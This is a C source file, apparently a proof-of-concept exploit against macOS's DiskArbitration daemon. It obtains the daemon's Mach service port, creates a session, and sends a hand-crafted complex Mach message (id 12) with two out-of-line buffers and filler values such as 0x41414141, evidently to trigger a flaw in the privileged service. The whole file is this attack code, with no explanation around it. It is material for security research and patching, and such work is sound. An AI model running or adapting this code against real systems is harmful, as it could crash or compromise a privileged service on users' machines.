
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>

extern kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);

kern_return_t fetch_mach_service_port(const char *service_name, mach_port_name_t *service_port) {

    mach_port_t bs_port = MACH_PORT_NULL;

    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bs_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Get bootstrap port failed: %s\n", mach_error_string(kr));
        return kr;
    }

    kr = bootstrap_look_up(bs_port, service_name, service_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] bootstrap_look_up failed: %s\n", mach_error_string(kr));
    } else
        printf("[+] service_port = 0x%x\n", *service_port);
    return kr;
}

kern_return_t da_create_session(mach_port_t service, mach_port_t *session) {

    typedef struct da_create_session_request_s da_create_session_request_t;
    typedef struct da_create_session_reply_s da_create_session_reply_t;

#pragma pack(4)
    struct da_create_session_request_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        uint32_t unk;
        uint32_t length;
        char buffer[0x20];
    };
#pragma pack(0)

#pragma pack(4)
    struct da_create_session_reply_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_port_descriptor_t port;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        da_create_session_request_t request;
        da_create_session_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    da_create_session_request_t *request = &message.request;
    da_create_session_reply_t *reply = &message.reply;

    request->header.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = service;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 0x9;

    request->NDR = NDR_record;

    request->length = sizeof(request->buffer);
    memset(request->buffer, 'A', sizeof(request->buffer) - 1);

    mach_msg_return_t msg_result;
    msg_result = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                          (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                          request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    *session = reply->port.name;
    printf("[+] session = 0x%x\n", *session);
    return KERN_SUCCESS;
}

kern_return_t da_session_register_callback(mach_port_t session) {

    char buffer[0x40] = {0};
    memset(buffer, 'X', sizeof(buffer) - 1);

    typedef struct da_session_register_callback_request_s da_session_register_callback_request_t;
    typedef struct da_session_register_callback_reply_s da_session_register_callback_reply_t;

#pragma pack(4)
    struct da_session_register_callback_request_s {
        mach_msg_header_t header;
        mach_msg_body_t msgh_body;
        mach_msg_ool_descriptor_t data1;
        mach_msg_ool_descriptor_t data2;
        NDR_record_t NDR;

        uint64_t unk1;
        uint64_t unk2;
        uint32_t unk3;
        uint32_t unk4;

        uint32_t length1;
        uint32_t length2;
    };
#pragma pack(0)

#pragma pack(4)
    struct da_session_register_callback_reply_s {
        mach_msg_header_t header;
        NDR_record_t NDR;
        kern_return_t ret_code;
        mach_msg_trailer_t trailer;
    };
#pragma pack(0)

    union {
        da_session_register_callback_request_t request;
        da_session_register_callback_reply_t reply;
    } message;

    memset(&message, 0, sizeof(message));

    da_session_register_callback_request_t *request = &message.request;
    da_session_register_callback_reply_t *reply = &message.reply;

    request->header.msgh_bits =
        MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;
    request->header.msgh_size = sizeof(*request);
    request->header.msgh_remote_port = session;
    request->header.msgh_local_port = mig_get_reply_port();
    request->header.msgh_voucher_port = 0x00;
    request->header.msgh_id = 12;

    request->msgh_body.msgh_descriptor_count = 2;
    request->NDR = NDR_record;

    request->data1.address = buffer;
    request->data1.size = sizeof(buffer);
    request->data1.copy = 1;
    request->data1.deallocate = 0;
    request->data1.type = MACH_MSG_OOL_DESCRIPTOR;

    request->data2.address = buffer;
    request->data2.size = sizeof(buffer);
    request->data2.copy = 1;
    request->data2.deallocate = 0;
    request->data2.type = MACH_MSG_OOL_DESCRIPTOR;

    request->unk1 = 0x41414141;
    request->unk2 = 0x42424242;
    request->unk3 = 0x43434343;
    request->unk4 = 0x44444444;

    request->length1 = sizeof(buffer);
    request->length2 = sizeof(buffer);

    mach_msg_return_t msg_result;
    msg_result = mach_msg(&request->header, MACH_SEND_MSG | MACH_RCV_MSG | MACH_MSG_OPTION_NONE,
                          (mach_msg_size_t)sizeof(*request), (mach_msg_size_t)sizeof(*reply),
                          request->header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

    return KERN_SUCCESS;
}

int poc(void) {

    mach_port_t service = MACH_PORT_NULL;
    fetch_mach_service_port("com.apple.DiskArbitration.diskarbitrationd", &service);

    mach_port_t session = MACH_PORT_NULL;
    da_create_session(service, &session);

    da_session_register_callback(session);

    return 0;
}
